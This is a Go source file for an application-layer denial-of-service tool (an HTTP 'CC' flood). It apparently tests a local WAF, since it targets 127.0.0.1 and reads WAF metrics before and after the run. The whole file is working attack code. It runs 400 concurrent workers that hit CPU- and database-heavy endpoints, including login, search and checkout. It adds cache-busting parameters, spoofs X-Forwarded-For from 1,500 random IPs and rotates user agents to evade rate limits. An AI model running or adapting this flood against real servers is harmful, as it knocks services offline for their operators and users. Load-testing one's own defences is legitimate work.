// Round 13 L7 CC Attack Tool - Application Resource Exhaustion
// Targets the APPLICATION layer (L7):
//   Complete HTTP request-response cycles targeting expensive backend endpoints.
//   Focuses on CPU/database-intensive operations that consume server resources.
//
// Contrast with L4 DDoS: this attack uses full HTTP semantics.
// The WAF sees valid, complete HTTP requests — the "attack" is in the
// frequency, targeting, and cache-busting pattern, not the TCP/HTTP form.
//
// Usage: go run round13_cc_l7.go

package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	TargetURL  = "http://127.0.0.1:8081"
	StatusFile = "./data/status.json"

	CCWorkers    = 400
	CCDuration   = 50 * time.Second
	CCUniqueIPs  = 1500
	CCBurstSize  = 20
)

// Expensive backend endpoints — these trigger computation, not static file serving
var ccTargets = []struct {
	Method string
	Path   string
	Body   string
	Desc   string
}{
	// Dynamic page generation (CPU + DB)
	{"GET", "/", "", "homepage_dynamic"},
	{"GET", "/login", "", "login_page"},
	{"GET", "/admin", "", "admin_dashboard"},
	{"GET", "/user/profile", "", "user_profile"},

	// Search API — database query overhead
	{"GET", "/api/v1/search", "", "search_api"},
	{"GET", "/search", "", "search_page"},
	{"GET", "/api/v1/products", "", "products_list"},
	{"GET", "/products", "", "products_page"},

	// POST endpoints — form processing, auth
	{"POST", "/login", "username=admin&password=test123", "login_post"},
	{"POST", "/api/v1/login", `{"username":"admin","password":"test123"}`, "api_login"},
	{"POST", "/api/v1/users", `{"name":"test","email":"x@x.com"}`, "user_create"},
	{"POST", "/contact", "name=test&message=hello&email=x@x.com", "contact_form"},

	// Resource-heavy pages
	{"GET", "/category/electronics", "", "category_page"},
	{"GET", "/checkout", "", "checkout_page"},
	{"GET", "/cart", "", "cart_page"},
}

type AttackStats struct {
	totalSent       int64
	totalBlocked    int64
	totalChallenged int64
	totalPassed     int64
	totalErrors     int64
	startTime       time.Time
}

func randomIP(rng *rand.Rand) string {
	subnets := [][]int{
		{10, 0, 0, 0}, {172, 16, 0, 0}, {192, 168, 0, 0},
		{100, 64, 0, 0}, {1, 0, 0, 0}, {45, 0, 0, 0},
		{103, 0, 0, 0}, {114, 0, 0, 0}, {116, 0, 0, 0},
		{117, 0, 0, 0}, {118, 0, 0, 0}, {119, 0, 0, 0},
		{121, 0, 0, 0}, {123, 0, 0, 0}, {124, 0, 0, 0},
		{125, 0, 0, 0}, {180, 0, 0, 0}, {182, 0, 0, 0},
		{183, 0, 0, 0}, {202, 0, 0, 0}, {203, 0, 0, 0},
		{210, 0, 0, 0}, {211, 0, 0, 0}, {218, 0, 0, 0},
		{219, 0, 0, 0}, {220, 0, 0, 0}, {221, 0, 0, 0},
		{222, 0, 0, 0}, {223, 0, 0, 0},
	}
	s := subnets[rng.Intn(len(subnets))]
	a := s[0] + rng.Intn(256-s[0])
	if a > 255 { a = s[0] }
	return fmt.Sprintf("%d.%d.%d.%d", a, rng.Intn(256), rng.Intn(256), rng.Intn(254)+1)
}

func randomUA(rng *rand.Rand) string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S9080) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
	}
	return uas[rng.Intn(len(uas))]
}

func getMetrics() string {
	data, err := os.ReadFile(StatusFile)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	return string(data)
}

func makeClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:          200,
			MaxIdleConnsPerHost:   100,
			IdleConnTimeout:       90 * time.Second,
			DisableCompression:    false,
			DisableKeepAlives:     false,
			ResponseHeaderTimeout: 10 * time.Second,
		},
		Timeout: 15 * time.Second,
	}
}

func pct(part, total int64) float64 {
	if total == 0 { return 0 }
	return float64(part) / float64(total) * 100
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Println("round13_cc_l7 v1.0")
		return
	}

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("  L7 CC ATTACK - Application Resource Exhaustion")
	fmt.Printf("  Workers: %d | IPs: %d | Targets: %d | Burst: %d\n",
		CCWorkers, CCUniqueIPs, len(ccTargets), CCBurstSize)
	fmt.Println(strings.Repeat("=", 60))

	// Print target endpoints
	fmt.Println("\n  Target Endpoints (expensive backend operations):")
	for _, t := range ccTargets {
		fmt.Printf("    %s %-35s [%s]\n", t.Method, t.Path, t.Desc)
	}

	fmt.Printf("\nBefore Attack - WAF Metrics:\n%s\n", getMetrics())

	stats := &AttackStats{startTime: time.Now()}
	client := makeClient()

	ips := make([]string, CCUniqueIPs)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := range ips {
		ips[i] = randomIP(rng)
	}

	var wg sync.WaitGroup
	stopCh := make(chan struct{})

	for w := 0; w < CCWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			localRng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for {
				select {
				case <-stopCh:
					return
				default:
				}

				// Pick target endpoint
				target := ccTargets[localRng.Intn(len(ccTargets))]
				ip := ips[localRng.Intn(len(ips))]
				ua := randomUA(localRng)

				// Burst: multiple requests from same IP to same endpoint
				for i := 0; i < CCBurstSize; i++ {
					select {
					case <-stopCh:
						return
					default:
					}

					url := TargetURL + target.Path

					// Cache-busting: every request gets unique query params
					if target.Method == "GET" {
						sep := "?"
						if strings.Contains(target.Path, "?") {
							sep = "&"
						}
						url = fmt.Sprintf("%s%s_t=%d&r=%d&uid=%d",
							url, sep, time.Now().UnixNano(), localRng.Int63(), localRng.Intn(99999))
					}

					var body io.Reader
					if target.Body != "" {
						// Slightly vary POST bodies
						body = strings.NewReader(target.Body)
					}

					req, _ := http.NewRequest(target.Method, url, body)
					req.Header.Set("User-Agent", ua)
					req.Header.Set("X-Forwarded-For", ip)
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
					req.Header.Set("Accept-Language", "en-US,en;q=0.5")
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Cache-Control", "no-cache")
					if target.Body != "" {
						req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					}

					resp, err := client.Do(req)
					atomic.AddInt64(&stats.totalSent, 1)

					if err != nil {
						atomic.AddInt64(&stats.totalErrors, 1)
						continue
					}

					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()

					switch {
					case resp.StatusCode == 403:
						atomic.AddInt64(&stats.totalBlocked, 1)
					case resp.StatusCode == 429:
						atomic.AddInt64(&stats.totalChallenged, 1)
					case resp.StatusCode == 200:
						atomic.AddInt64(&stats.totalPassed, 1)
					default:
						atomic.AddInt64(&stats.totalErrors, 1)
					}
				}

				// Small gap between bursts (50-150ms)
				select {
				case <-stopCh:
					return
				case <-time.After(time.Duration(50+localRng.Intn(100)) * time.Millisecond):
				}
			}
		}(w)
	}

	// Progress reporting
	ticker := time.NewTicker(5 * time.Second)
	go func() {
		for range ticker.C {
			elapsed := time.Since(stats.startTime)
			total := atomic.LoadInt64(&stats.totalSent)
			fmt.Printf("  [%ds] sent=%d blocked=%d challenged=%d passed=%d (%.0f req/s)\n",
				int(elapsed.Seconds()), total,
				atomic.LoadInt64(&stats.totalBlocked),
				atomic.LoadInt64(&stats.totalChallenged),
				atomic.LoadInt64(&stats.totalPassed),
				float64(total)/elapsed.Seconds())
		}
	}()

	time.Sleep(CCDuration)
	close(stopCh)
	ticker.Stop()
	wg.Wait()

	elapsed := time.Since(stats.startTime)
	total := atomic.LoadInt64(&stats.totalSent)
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("  L7 CC Attack Complete — %v\n", elapsed.Round(time.Second))
	fmt.Printf("  Total Sent:       %d\n", total)
	fmt.Printf("  Blocked (403):    %d (%.1f%%)\n", atomic.LoadInt64(&stats.totalBlocked), pct(atomic.LoadInt64(&stats.totalBlocked), total))
	fmt.Printf("  Challenged (429): %d (%.1f%%)\n", atomic.LoadInt64(&stats.totalChallenged), pct(atomic.LoadInt64(&stats.totalChallenged), total))
	fmt.Printf("  Passed (200):     %d (%.1f%%)\n", atomic.LoadInt64(&stats.totalPassed), pct(atomic.LoadInt64(&stats.totalPassed), total))
	fmt.Printf("  Errors:           %d\n", atomic.LoadInt64(&stats.totalErrors))
	fmt.Printf("  Rate:             %.0f req/s\n", float64(total)/elapsed.Seconds())
	fmt.Println(strings.Repeat("=", 60))

	time.Sleep(2 * time.Second)
	fmt.Printf("\nAfter Attack - WAF Metrics:\n%s\n", getMetrics())
	fmt.Println("\nDone.")
}
